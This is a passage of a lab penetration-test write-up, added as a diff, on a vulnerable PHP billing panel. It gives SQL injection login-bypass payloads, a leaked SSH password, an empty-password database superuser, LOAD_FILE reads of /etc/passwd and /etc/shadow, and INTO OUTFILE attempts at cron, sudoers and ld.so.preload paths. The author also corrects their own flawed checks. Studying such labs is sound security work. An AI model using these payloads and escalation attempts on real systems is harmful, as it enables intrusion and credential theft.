+<p>The vector fires. <strong>The file is owned by <code>mysql</code>, uid 103</strong> — and that is the whole
+answer, confirmed from the daemon's own <code>/proc</code>, not inferred from a mode:</p>
+<pre><code>$ cat /proc/132/status     # the mariadbd that performed the write
+Name:	mariadbd
+Uid:	103	103	103	103
+Gid:	104	104	104	104
+</code></pre>
+<p><code>real = effective = saved = filesystem = 103</code>. <strong>No setuid transition.</strong> The database
+superuser is not the operating-system superuser, and a DBA cannot become root merely by
+being a DBA.</p>
+<p><strong>Nine write attempts, one success, and the success is in the wrong directory.</strong> Each
+attempt is a real <code>INTO OUTFILE</code>, verified by marker and not by existence (see §7.1 for
+why that distinction is load-bearing):</p>
+<table>
+<thead>
+<tr>
+<th>Target path</th>
+<th>Before</th>
+<th>After</th>
+<th>Owner</th>
+<th>Marker</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/tmp/duque243_v3.txt</code></td>
+<td>NO</td>
+<td>YES</td>
+<td><code>mysql(103)</code></td>
+<td>1</td>
+<td><strong>WROTE-BY-ME</strong></td>
+</tr>
+<tr>
+<td><code>/usr/lib/php/sessionclean</code></td>
+<td>YES</td>
+<td>YES</td>
+<td><code>root(0)</code></td>
+<td>0</td>
+<td>PREEXISTING, <strong>not</strong> written (<code>ERROR 1086 already exists</code>)</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/duque243</code></td>
+<td>NO</td>
+<td>NO</td>
+<td>—</td>
+<td>0</td>
+<td>DENIED, <code>Errcode: 13</code></td>
+</tr>
+<tr>
+<td><code>/etc/ld.so.preload</code></td>
+<td>NO</td>
+<td>NO</td>
+<td>—</td>
+<td>0</td>
+<td>DENIED, <code>Errcode: 13</code></td>
+</tr>
+<tr>
+<td><code>/etc/sudoers.d/duque243</code></td>
+<td>NO</td>
+<td>NO</td>
+<td>—</td>
+<td>0</td>
+<td>DENIED, <code>Errcode: 13</code></td>
+</tr>
+<tr>
+<td><code>/root/duque243</code></td>
+<td>NO</td>
+<td>NO</td>
+<td>—</td>
+<td>0</td>
+<td>DENIED, <code>Errcode: 13</code></td>
+</tr>
+<tr>
+<td><code>/var/www/html/bills/duque243.php</code></td>
+<td>NO</td>
+<td>NO</td>
+<td>—</td>
+<td>0</td>
+<td>DENIED, <code>Errcode: 13</code></td>
+</tr>
+<tr>
+<td><code>/usr/local/bin/duque243</code></td>
+<td>NO</td>
+<td>NO</td>
+<td>—</td>
+<td>0</td>
+<td>DENIED, <code>Errcode: 13</code></td>
+</tr>
+<tr>
+<td><code>/etc/profile.d/duque243.sh</code></td>
+<td>NO</td>
+<td>NO</td>
+<td>—</td>
+<td>0</td>
+<td>DENIED, <code>Errcode: 13</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>7 of 7 root-consumed or web-consumed paths denied.</strong> The one root-executed cron job on
+this host (<code>/etc/cron.d/php</code>, <code>09,39 * * * *</code>, runs <code>/usr/lib/php/sessionclean</code> as root)
+is the obvious target and is not writable — the write returns <code>Errcode: 13</code>, and the
+target file it invokes is <code>root(0) 755</code> with <code>mtime</code> still <code>2022-01-28 00:27:02</code>.</p>
+<p><strong>The remaining escalation surface from <code>uid=1000(duque)</code>, each measured as <code>duque</code>:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Vector</th>
+<th>Measurement</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo</code></td>
+<td><code>Sorry, user duque may not run sudo on 74c0aa27e3ec.</code></td>
+<td>not granted</td>
+</tr>
+<tr>
+<td><code>su root</code> with the leaked password</td>
+<td><code>su: Authentication failure</code></td>
+<td>denied</td>
+</tr>
+<tr>
+<td>SUID/SGID binaries</td>
+<td><strong>18</strong> found as root, all stock Ubuntu, none identity-changing without a root password</td>
+<td>no vector</td>
+</tr>
+<tr>
+<td>File capabilities</td>
+<td><code>getcap /bin/bash /bin/sh /usr/bin/python3</code> → <strong>empty</strong></td>
+<td>none</td>
+</tr>
+<tr>
+<td>Writable files (<code>find -writable</code>, as <code>duque</code>)</td>
+<td><strong>4</strong>, all under <code>[lab-home]/duque</code></td>
+<td>no system path</td>
+</tr>
+<tr>
+<td>Same predicate, second tool (<code>test -w</code>, as <code>duque</code>)</td>
+<td><code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/sudoers</code>, <code>/usr/local/bin/sudo</code>, <code>/etc/cron.d</code> → all <code>no</code></td>
+<td><strong>agrees</strong></td>
+</tr>
+<tr>
+<td>Webroot writability (<code>test -w</code>, as <code>duque</code>)</td>
+<td><code>/var/www/html</code>, <code>/bills</code>, <code>panel.php</code>, <code>index.php</code> → all <code>no</code></td>
+<td>not writable</td>
+</tr>
+<tr>
+<td><code>PATH</code> directories writable by <code>duque</code></td>
+<td><strong>8</strong> checked, all <code>no</code></td>
+<td>no hijack</td>
+</tr>
+<tr>
+<td><code>/etc/sudoers.d/</code></td>
+<td>only <code>README</code>, <code>root(0)</code>, <code>-r--r-----</code></td>
+<td>no grant</td>
+</tr>
+<tr>
+<td>Docker socket</td>
+<td><code>/var/run/docker.sock</code> → <code>No such file or directory</code></td>
+<td>absent</td>
+</tr>
+<tr>
+<td><code>/etc/shadow</code></td>
+<td><code>cat: /etc/shadow: Permission denied</code></td>
+<td>not readable</td>
+</tr>
+<tr>
+<td>root over SSH</td>
+<td>3 attempts (wrong / empty / the leaked value) → <code>Authentication failed</code> ×3</td>
+<td>refused</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Conclusion: no path from <code>uid=1000(duque)</code> to <code>uid=0(root)</code> was found, and the two
+tools that could have disagreed about writability agreed.</strong> The lab does not ship a
+root escalation, and the description does not claim one — so unlike lab 189 there is no
+misattributed root to correct. F5 is a real boundary failure with real consequences
+(full DBA, arbitrary file write as <code>mysql</code>, unrestricted <code>LOAD_FILE</code> of anything
+world-readable) that stops one step short of root, and the stop is measured.</p>
+<hr />
+<h2 id="4-the-chain">4. The chain</h2>
+<p>Every hop carries the measured identity, and every hop is quoted. No hop is asserted.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof (verbatim)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>attacker, unauthenticated</td>
+<td><code>POST /bills/index.php</code> — no cookie, no credential</td>
+<td><code>GET /bills/panel.php</code> → <code>302</code>, <strong>0 bytes</strong></td>
+</tr>
+<tr>
+<td>1</td>
+<td><strong><code>root@localhost</code> on MariaDB</strong> (web tier)</td>
+<td>F1, SQLi. Execution identity of the PHP process</td>
+<td>Apache children: <code>Name: apache2</code> / <code>Uid: 33 33 33 33</code> (master pid 224 is <code>Uid: 0 0 0 0</code> — the master is root, the request handlers are not). DB session: <code>CURRENT_USER() = root@localhost</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>administrator session</strong></td>
+<td>F1 (<code>admin' -- </code>) <em>or</em> F3 (<code>Admin</code>/<code>admin123</code>) — two independent routes</td>
+<td><code>Login success: Admin</code>; rendered identity <code>👤 admin (Administrator)</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>the leaked credential</strong></td>
+<td>F2, <code>panel.php:270</code> <code>=== 'xyc724'</code></td>
+<td>response <code>200</code>, <strong>5 994 bytes</strong>, body contains <code>duquelaje81029557!</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>interactive shell on the host</strong></td>
+<td>SSH with the value from step 3</td>
+<td><code>uid=1000(duque) gid=1000(duque) groups=1000(duque)</code>; <code>Uid: 1000 1000 1000 1000</code>; <code>whoami</code> → <code>duque</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>full DBA, as a local uid</strong></td>
+<td>F5, empty-password <code>root@localhost</code> reached over loopback from the step-4 shell</td>
+<td><code>USER() = root@localhost</code>, <code>CURRENT_USER() = root@localhost</code>, <code>GRANT ALL PRIVILEGES ON *.* … WITH GRANT OPTION</code>; still <code>uid=1000(duque)</code> in the shell</td>
+</tr>
+<tr>
+<td>6</td>
+<td><s>root</s></td>
+<td><strong>did not happen</strong> — F6</td>
+<td>the write landed as <code>mysql(103)</code>; <code>mariadbd</code> <code>Uid: 103 103 103 103</code>; 7/7 root-consumed paths <code>Errcode: 13</code></td>
+</tr>
+</tbody>
+</table>
+<p>Steps 1→2 and 3→4 are the two declared bugs. Step 5 is undeclared. Step 6 is the
+escalation that failed and is reported as such.</p>
+<p><strong>The <code>xyc724</code> identifier was not guessed — it was enumerated, with a count.</strong> The
+panel's own default view hands out two ids, both generic. The leak id is not linked
+anywhere. So the length of the response was used as the detector:</p>
+<table>
+<thead>
+<tr>
+<th>Response size</th>
+<th>Meaning</th>
+<th>Count in the sweep</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>5 906</strong></td>
+<td><code>Factura no encontrada</code></td>
+<td><strong>25 979</strong></td>
+</tr>
+<tr>
+<td><strong>6 163</strong></td>
+<td>the generic invoice</td>
+<td><strong>20</strong></td>
+</tr>
+<tr>
+<td><strong>5 994</strong></td>
+<td><strong>the leak</strong></td>
+<td><strong>1</strong></td>
+</tr>
+</tbody>
+</table>
+<p>The full formatted identifier space the panel documents — <code>xy</code> + one lowercase letter +
+three digits — is 26 × 1 000 = <strong>26 000</strong>. All 26 000 were requested in 31.5 s
+(825 req/s, 20-way parallel) and each result recorded individually:</p>
+<pre><code>total candidates tested: 26000
+distinct sizes: 25979×5906, 20×6163, 1×5994
+ids whose size is not the 5906 baseline: 21
+ids whose size is neither baseline nor generic: xyc724 (5994)
+content re-verified on that id: leakcount=1
+</code></pre>
+<p>25 979 + 20 + 1 = 26 000. <strong>The detector is proven in both directions:</strong> it fired on
+exactly one id, that id was then confirmed by <em>content</em> rather than by size
+(<code>leakcount=1</code>), and 25 999 others returned the two baselines. This is what the equal-
+length design (§6) failed to prevent — and note the sweep was run as <code>admin</code>, because
+that is the only identity the handler admits.</p>
+<hr />
+<h2 id="5-are-the-two-declared-vulnerabilities-independent--and-is-the-escalation-misattributed">5. Are the two declared vulnerabilities independent? — and is the escalation misattributed?</h2>
+<p>These are two separate questions and they have two different answers.</p>
+<h3 id="51-they-are-genuinely-independent--neither-enables-the-other">5.1 They are genuinely independent — neither enables the other</h3>
+<p>This is the question the brief asks, and the honest answer is the one that is easiest to
+get wrong in the other direction. The obvious hypothesis is &quot;the SQLi is the entry, and
+the IDOR-ish branch is the prize, so it is a chain.&quot; <strong>That hypothesis is false, and it
+is falsified by a login that contains no injection at all:</strong></p>
+<pre><code>$ curl -XPOST -d 'username=Admin' -d 'password=admin123' /bills/index.php
+http/bytes=200 79   Login success: Admin
+</code></pre>
+<p><code>Admin</code> / <code>admin123</code> is a working credential pair, because F3 stores passwords in
+plaintext and the author chose a guessable one. So:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Entry path for F2</th>
+<th>Needs F1?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Route A</td>
+<td><code>Admin</code> / <code>admin123</code>, no injection — <strong>measured, 200/79 B</strong></td>
+<td><strong>no</strong></td>
+</tr>
+<tr>
+<td>Route B</td>
+<td><code>admin' -- </code>, SQLi — <strong>measured, 200/79 B</strong></td>
+<td>yes</td>
+</tr>
+</tbody>
+</table>
+<p>and symmetrically, F1 is exploitable with no reference to F2 whatsoever — the <code>UNION</code>
+dump in §3 F1 used no session and no panel access.</p>
+<p><strong>Why this matters to the client, and it is not a technicality.</strong> If the two were filed
+as one chain, the natural remediation is &quot;fix the SQLi&quot;, and fixing F1 leaves F2
+completely intact and reachable by anyone who types <code>admin123</code>. Filed separately, the
+report says what is true: <strong>two independent defects, each with its own fix, either of
+which alone reaches the same secret.</strong> The independence is the finding.</p>
+<p><strong>What they share is an endpoint, not a dependency.</strong> Both terminate at the same leaked
+credential, and both hand off to the same SSH hop — so the <em>impact</em> is coupled even
+though the <em>reachability</em> is not. That is the correct way to state it: not a chain,
+and not two unrelated bugs either.</p>
+<h3 id="52-the-escalation-is-not-misattributed-by-the-description--but-the-source-is">5.2 The escalation is not misattributed by the description — but the source is</h3>
+<p>Covered in full at §2.2, and the distinction is worth repeating because it changes what
+gets written in the report:</p>
+<ul>
+<li><strong>The catalogue description</strong> — <em>&quot;Laboratorio para practicar hacking web con la
+explotación de dos vulnerabilidades.&quot;</em> — names <strong>no class, no path, and no escalation</strong>.
+There is nothing in it to misattribute. Read in full, not paraphrased.</li>
+<li><strong>The artefact's own comment</strong> (<code>panel.php:3</code>, and again at <code>panel.php:271</code>) calls F2
+an <strong>IDOR</strong>. That is wrong, and §2.2 carries the measurement that refutes it: the
+middle case of the three is a <strong>refusal</strong>, not a cross-user read.</li>
+</ul>
+<p>So: <strong>a lab design defect, filed as such, and it is a labelling defect rather than a
+chain defect.</strong> The lab's <em>escalation</em> claim — two web bugs — is accurate. The lab's
+<em>class label</em> for the second one is not. Contrast lab 189, where the description named
+a root path that did not exist and the real root came from a third undeclared bug; here
+the description names nothing, and the undeclared third issue (F5) is a privilege
+failure that does not reach root.</p>
+<h3 id="53-the-undeclared-issues-and-which-of-them-the-declared-ones-enable">5.3 The undeclared issues, and which of them the declared ones enable</h3>
+<p><strong>The most valuable output of this engagement is that three of the six findings are not
+in the lab's description.</strong> Stated explicitly, as the brief asks:</p>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Advertised?</th>
+<th>Reachable how?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>F1 SQLi</td>
+<td><strong>yes</strong></td>
+<td>unauthenticated</td>
+</tr>
+<tr>
+<td>F2 hardcoded credential</td>
+<td><strong>yes</strong></td>
+<td>admin session — from F1 <strong>or</strong> from F3 alone</td>
+</tr>
+<tr>
+<td>F3 plaintext passwords</td>
+<td><strong>no</strong></td>
+<td>unauthenticated via F1; the guessable value is public</td>
+</tr>
+<tr>
+<td>F4 session fixation</td>
+<td><strong>no</strong></td>
+<td>needs a cookie delivered to a victim (<strong>NOT tested</strong>, §8)</td>
+</tr>
+<tr>
+<td>F5 empty-password DBA</td>
+<td><strong>no</strong></td>
+<td>any local uid — reached here <strong>through F2's SSH hop</strong></td>
+</tr>
+<tr>
+<td>F6 escalation that failed</td>
+<td><strong>no</strong></td>
+<td>the negative half of F5</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Two composition findings, each distinct from either component:</strong></p>
+<ol>
+<li><strong>F2 → F5 is a genuine two-stage chain, and it is the one that matters.</strong> The web
+panel leaks a host password; that password opens a host shell; that shell is
+accepted as the database superuser because the password is empty. The end state is
+full DBA, and <strong>neither F2 nor F5 alone gets there.</strong> F5 alone is only reachable from
+a local shell, and the only local shell in the lab is the one F2 hands over. This is
+the finding the description's &quot;hacking web&quot; framing hides entirely.</li>
+<li><strong>F4 → F2 removes the credential requirement.</strong> Fixation delivers an authenticated
+session without any password, and an admin session is the gate on F2 (§4). So F4 is
+not an independent medium-severity session bug — it is a way to reach the lab's
+headline secret with zero credentials. Its limit is delivery, not impact (§8).</li>
+</ol>
+<hr />
+<h2 id="6-controls-that-held">6. Controls that held</h2>
+<p>A control that has never fired is not a control. Every row below names the positive
+control that proves the detector can see a success.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Where</th>
+<th>Positive control that proves this detector works</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>require</code> on the session, before any invoice data</td>
+<td><code>panel.php:9-12</code></td>
+<td>Fired: anonymous <code>id=xyc724</code> → <code>302</code>, <strong>0 bytes</strong>, <code>Location: /bills/index.php</code>. A 200 with a body would mean the gate failed.</td>
+</tr>
+<tr>
+<td><code>$isAdmin</code> role gate on the whole invoice block</td>
+<td><code>panel.php:14</code>, <code>:257</code></td>
+<td>Fired in <strong>both</strong> directions: <code>mario</code> → <code>200</code>/5 467 B/<code>Acceso Denegado</code>; <code>admin</code> → <code>200</code>/5 994 B/secret. A gate that only ever produced the denial could not be distinguished from a broken handler.</td>
+</tr>
+<tr>
+<td>Format validator — <strong>inert, see §2.3</strong></td>
+<td><code>panel.php:27-29</code></td>
+<td><code>grep</code> → 1 hit, the definition. No call site. Not a control.</td>
+</tr>
+<tr>
+<td>Equal-length generic response</td>
+<td><code>panel.php:32-46</code>, comment at <code>:33</code></td>
+<td><strong>Held for 20 of 20</strong> ids that reach it — the 19 non-vulnerable entries of <code>$database</code> plus <code>xyu597</code> accepted by the `</td>
+</tr>
+<tr>
+<td>Unused-password rejection</td>
+<td><code>bills/index.php:27-28</code></td>
+<td>Fired: <code>mario1234</code> and <code>admin1234</code> → 4 787 B <code>Login fallido</code>, against 79 B on the correct value.</td>
+</tr>
+<tr>
+<td><code>root@localhost</code> not exposed off-box</td>
+<td><code>bills/index.php:3</code> (<code>127.0.0.1</code>)</td>
+<td><code>nmap -p-</code> → no 3306; <code>/proc/net/tcp</code> → <code>0100007F:0CEA</code> = <code>127.0.0.1:3306</code> only. The finding is local, and this is why.</td>
+</tr>
+<tr>
+<td><code>LOAD_FILE</code> refuses what the daemon cannot read</td>
+<td>MariaDB</td>
+<td><strong>Fired and refused correctly:</strong> <code>/etc/passwd</code> → <strong>1 399 bytes, all 26 accounts</strong>; <code>/etc/shadow</code> → <code>NULL</code>; <code>[lab-home]/duque/.profile</code> → <code>NULL</code> (mode <code>0750 duque:duque</code>, the <code>mysql</code> uid is not in that group). The detector reads, so its <code>NULL</code> means <em>denied</em>, not <em>broken</em>.</td>
+</tr>
+<tr>
+<td><code>mysqld</code> cannot be pointed at root-owned paths</td>
+<td>filesystem</td>
+<td>7 of 7 write attempts returned <code>Errcode: 13</code>; the 8th returned <code>ERROR 1086 already exists</code> with <code>mtime</code> unchanged.</td>
+</tr>
+<tr>
+<td>No <code>sudo</code> for <code>duque</code></td>
+<td><code>/etc/sudoers</code></td>
+<td><code>Sorry, user duque may not run sudo on 74c0aa27e3ec.</code> — a policy denial, not a wrong password.</td>
+</tr>
+<tr>
+<td>No Docker socket in the container</td>
+<td>—</td>
+<td><code>/var/run/docker.sock</code> → <code>No such file or directory</code>, so the container-escape class is genuinely absent rather than unmeasured.</td>
+</tr>
+<tr>
+<td>No <code>FLAG{}</code> anywhere</td>
+<td>whole filesystem</td>
+<td>30-name <code>find</code>, plus <code>grep -rIl 'FLAG{' /</code> → see §9, with the search's own false positives read rather than counted.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-instrumentation-defects">7. Instrumentation defects</h2>
+<p>Four of my own. Two of them pointed at a real finding and one of those was <strong>wrong in the
+most dangerous direction available</strong> — it reported a root-owned write that never
+happened.</p>
+<h3 id="71-an-existence-check-reported-a-root-owned-file-that-the-database-never-wrote">7.1 An existence check reported a root-owned file that the database never wrote</h3>
+<p>My first write oracle was: attempt <code>INTO OUTFILE</code>, then <code>stat</code> the path. Against nine
+candidates, one line came back:</p>
+<pre><code>/usr/lib/php/sessionclean  -&gt;  WROTE owner=root(0) mode=755
+</code></pre>
+<p><strong>That is a fabricated privilege escalation.</strong> The SQL had returned
+<code>ERROR 1086 (HY000): File '/usr/lib/php/sessionclean' already exists</code> — MariaDB refuses
+to overwrite, which I had in the same line of output and did not read. The <code>-f</code> test then
+found the <strong>pre-existing</strong> root-owned file and my code labelled it as my own artefact.
+Had I stopped there, this writeup would have filed &quot;the database superuser can overwrite
+a root-executed cron helper&quot; as a Critical root escalation. It is false: the file is
+<code>root(0) 755</code> with <code>mtime 2022-01-28 00:27:02</code>, and the daemon that would have written
+it runs as uid 103.</p>
+<p>This is <code>method/self-corrections.md</code> §16 and §11 wearing a new costume: <strong>existence is
+not authorship.</strong> Rebuilt as <strong>oracle v3</strong>, which is what §3 F6's table actually reports:</p>
+<pre><code>[BASELINE] exists_before=YES
+[SQL]      ERROR 1086 ... already exists
+[AFTER]    exists=YES   owner=root(0)   mtime=2022-01-28 00:27:02  (unchanged)
+[MARKER]   0
+VERDICT    PREEXISTING-NOT-WRITTEN
+</code></pre>
+<p>The fix is the RUNBOOK's own rule: the witness must be <strong>distinguishable by design</strong> — a
+uniquely-marked payload plus a pre-existence baseline. Existence is not distinguishable
+by design; that is the whole defect.</p>
+<h3 id="72-a-rebuilt-oracle-that-measured-nothing-and-looked-like-a-negative">7.2 A rebuilt oracle that measured nothing, and looked like a negative</h3>
+<p>Fixing 7.1, my second attempt nested <code>$( )</code>, <code>tr</code> and <code>%s</code> substitution through
+<code>paramiko.exec_command</code> and the quoting collapsed. The output was self-contradictory
+(<code>exists=NO</code>, <code>[MARKER] 0</code>, and the echoed SQL visibly missing its quotes) — <strong>zero work
+done</strong>. Read at face value it says &quot;the database wrote nothing anywhere&quot;, which would
+have been a false negative contradicting the successful <code>/tmp</code> write two minutes earlier.</p>
+<p>What caught it was that the result <strong>contradicted a measurement I had already made</strong>,
+which is the §9 cross-check rule applied to my own batch. Count is zero, so it is
+<strong>UNTESTED</strong>, and it is not in §8's negative list. Fixed by base64-encoding the script
+and pushing it whole, which removed the quoting hazard instead of fighting it.</p>
+<h3 id="73-two-payloads-that-agreed-because-i-designed-them-to">7.3 Two payloads that agreed because I designed them to</h3>
+<p>My first SQLi pair was:</p>
+<pre><code>B1  admin' AND '1'='1   -&gt; 200, 4787 B, Login fallido
+B2  admin' AND '1'='2   -&gt; 200, 4787 B, Login fallido
+</code></pre>
+<p>Byte-identical. Read naively that is &quot;the boolean does not change the result, so there is
+no injection&quot; — and that conclusion would have been <strong>wrong</strong>, because <code>AND passwd = 'anything'</code> was still live in both, so both correctly returned zero rows. My
+payloads differed in a literal that could not matter. The error message for a bare quote
+(<code>500</code>, 0 bytes, with the fatal in <code>/var/log/apache2/error.log</code>) had already proven the
+quote reached the query; I had proof in hand and drew the wrong conclusion from a badly
+designed pair.</p>
+<p>The fix was <code>-- </code> to terminate the statement, which is what produced the real
+discriminator in §3 F1 (79 B vs 4 787 B). <strong>A uniform answer is a result about the
+search</strong> (§5 of the catalogue), and here it was a result about my payload.</p>
+<h3 id="74-a-read-of-the-source-that-would-have-produced-a-third-finding-that-does-not-exist">7.4 A read of the source that would have produced a third finding that does not exist</h3>
+<p><code>bills/index.php:12-14</code> is unmistakable:</p>
+<pre><code class="language-php">12:     if (!$result) {
+13:         // FATAL ERROR: This ensures debugging tools catch the syntax error immediately
+14:         die(&quot;DATABASE_ERROR: &quot; . mysqli_error($conn));
+</code></pre>
+<p>A line whose comment states its purpose is to make SQL errors visible to an attacker.
+Filing <strong>&quot;verbose SQL error disclosure, CWE-209&quot;</strong> from that source read alone would have
+been a plausible, well-cited, <strong>entirely false finding.</strong> It never fires:</p>
+<pre><code>$ curl -d &quot;username=admin'&amp;password=x&quot; /bills/index.php
+http=500  bytes=0
+
+$ tail -1 /var/log/apache2/error.log
+PHP Fatal error:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
+… in /var/www/html/bills/index.php:10 … thrown in /var/www/html/bills/index.php on line 10
+</code></pre>
+<p>The throw happens at <strong>line 10</strong> — <code>mysqli_query()</code> — because PHP 8.1's <code>mysqli</code>
+defaults to <code>MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT</code> and throws on a syntax error.
+Control never reaches line 12, so the <code>die()</code> on line 14 is <strong>unreachable code</strong>. And
+<code>display_errors=Off</code> (<code>error_reporting=22527</code>), so the client gets <strong>0 bytes</strong>; the text
+goes only to the server log.</p>
+<p><strong>The lab ships a disclosure line whose own comment claims it discloses, and it discloses
+nothing.</strong> The author wrote a defensive <code>if (!$result)</code> that PHP 8.1 makes unreachable,
+probably to make the SQLi easier to see during authoring, and the runtime disagreed.
+This is a third instance of the corpus's dead-control pattern, and it is the direct
+counter-example to &quot;measure what the framework consumes, not what the file contains&quot;
+(§21) — here the file contains an error handler and the <em>framework</em> never calls it.
+Recorded as defect <strong>D3</strong> in §2's family, and it is why F1 has no CWE-209 attached.</p>
+<h3 id="75-the-same-count-read-by-two-identities-disagreed-by-one">7.5 The same count, read by two identities, disagreed by one</h3>
+<p>The setuid sweep in §3 F6 returned <strong>17</strong> binaries when I ran it as <code>duque</code> over SSH,
+and <strong>18</strong> when I re-ran it as root. The missing one is
+<code>/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool</code> — a path under a <code>mysql</code>-owned
+directory that <code>uid=1000</code> cannot traverse. I reported <strong>18</strong>, the root-side count,
+because the question being asked is &quot;what setuid surface does this host have&quot;, and the
+<code>mysql</code>-owned plugin directory is part of that surface.</p>
+<p>This is <code>method/self-corrections.md</code> §2 in its mildest form: <strong>the count is a property of
+the reader, not only of the filesystem.</strong> Had I kept the <code>duque</code>-side 17 and written
+&quot;no interesting setuid binary under the database plugin directory&quot; — which is what a
+17-count invites — I would have reported an absence created entirely by my own
+privilege level, on a target where the database tier is the subject of the engagement.
+An enumeration negative now carries its reading identity with it.</p>
+<hr />
+<h2 id="8-not-tested-a-count-of-zero-is-untested-not-a-negative">8. NOT tested (a count of zero is untested, not a negative)</h2>
+<p>Each of these is an untested path, with the reason. None of them is a negative result,
+and none of them is evidence of absence.</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Work done</th>
+<th>Why untested</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Delivering the fixated cookie to a victim</strong></td>
+<td>0 attempts</td>
+<td>F4's <em>hijack</em> is proven (§4, §3 F4) but I found no XSS in this application to plant a cookie with, so I have no delivery mechanism to test. The open vectors are the missing <code>Secure</code> flag over plaintext HTTP and any network position. F4's impact claim stops at the replay for exactly this reason.</td>
+</tr>
+<tr>
+<td><strong>Reaching <code>xyc724</code> without the admin role</strong></td>
+<td>0 attempts beyond the 3-case matrix</td>
+<td>§2.2 measured the gate closed for the non-admin identity. I did not attempt to defeat <code>$isAdmin</code> itself (e.g. a <code>username</code> value that survives <code>strtolower</code> as <code>'admin'</code> while being a different row) — the SQLi already returns the real admin row, so there was no reason to.</td>
+</tr>
+<tr>
+<td><strong>MariaDB <code>root@localhost</code> via the <code>unix_socket</code> plugin</strong></td>
+<td>0 attempts</td>
+<td>Every DB connection in this engagement used <code>-h 127.0.0.1</code> over TCP, which is the path F5 is about. Whether a plugin account also exists is unmeasured; <code>SHOW GRANTS</code> reported only the two grants quoted in F5, and I did not enumerate the <code>mysql.global_priv</code> table.</td>
+</tr>
+<tr>
+<td><strong>Non-<code>xy</code> identifier formats</strong></td>
+<td>0 requests</td>
+<td>The sweep covered the 26 000 ids matching the format the panel documents. <code>isValidFormat</code> is never called (§2.3), so non-matching ids are also processed — but since the leak is a single <code>===</code> against one literal, no other shape can reach it. Stated as reasoning, not as a measurement.</td>
+</tr>
+<tr>
+<td><strong>Kernel-level escalation</strong></td>
+<td>0 attempts</td>
+<td><code>uname -a</code> reports the <strong>host</strong> kernel <code>7.0.0-34-generic</code>, shared with every container on this daemon and newer than this 22.04 userspace. It is not the lab's artefact, so no kernel vector was tested or reported against it.</td>
+</tr>
+<tr>
+<td><strong>The other 65 533 closed ports</strong></td>
+<td>65 535 TCP ports scanned, 2 open</td>
+<td>Not a blind spot: <code>/proc/net/udp</code> was read directly and holds <strong>zero</strong> UDP sockets, so the UDP class is absent by measurement rather than by TCP-scan blindness.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="9-discarded-with-a-reason">9. Discarded with a reason</h2>
+<p>Things I looked at and rejected, each with the evidence, so the rejection is checkable
+rather than asserted.</p>
+<table>
+<thead>
+<tr>
+<th>Rejected</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>&quot;Error disclosure, CWE-209&quot;</strong></td>
+<td>The disclosure line is unreachable — PHP 8.1's <code>mysqli</code> throws at <code>index.php:10</code> before the <code>if</code> at <code>:12</code>. Measured <code>500</code>/<strong>0 bytes</strong>; <code>display_errors=Off</code>. See §7.4.</td>
+</tr>
+<tr>
+<td><strong>&quot;IDOR, CWE-639&quot;</strong></td>
+<td>The non-admin case is a <strong>refusal</strong> (<code>Acceso Denegado</code>, 5 467 B), not a cross-user read, and the whole block is behind <code>$isAdmin</code> at <code>:257</code>. Refuted by the three-case matrix in §4. See §2.2.</td>
+</tr>
+<tr>
+<td><strong>&quot;Format validation is bypassable&quot;</strong></td>
+<td>There is nothing to bypass. <code>isValidFormat</code> is defined at <code>:27</code> and never called — <code>grep</code> returns one hit.</td>
+</tr>
+<tr>
+<td><strong>&quot;The equal-length response hides nothing&quot;</strong></td>
+<td>It holds for 20 of 20 generic ids at 6 163 B, but the handler emits two further lengths (5 906 B, 5 994 B). It is a real control with a real gap, not a fiction — recorded in §6 rather than as a finding.</td>
+</tr>
+<tr>
+<td><strong>&quot;F5 is a root escalation&quot;</strong></td>
+<td>The write lands as <code>mysql(103)</code>; <code>mariadbd</code>'s own <code>/proc/132/status</code> reads <code>Uid: 103 103 103 103</code>. 7 of 7 root-consumed paths returned <code>Errcode: 13</code>. Refuted with an oracle that fired. See §3 F6.</td>
+</tr>
+<tr>
+<td><strong>&quot;The kernel is a lab version&quot;</strong></td>
+<td><code>7.0.0-34-generic</code> is the host's, not the image's. Discarded as a property of the operator's machine.</td>
+</tr>
+<tr>
+<td><strong><code>/intranet/</code> and <code>/empleados/</code> as an access-control surface</strong></td>
+<td>Both are static <code>index.html</code> files that <em>are</em> the denial page. There is no server-side check behind them, so there is nothing to bypass and nothing to report.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="10-reward">10. Reward</h2>
+<p><strong>No <code>FLAG{}</code> or equivalent exists.</strong> Re-run against the <strong>restored</strong> container, so the
+counts are not polluted by my own probe markers (the pre-restore run returned 6 paths
+because 2 of them were files I had written):</p>
+<table>
+<thead>
+<tr>
+<th>Search</th>
+<th>Scope</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
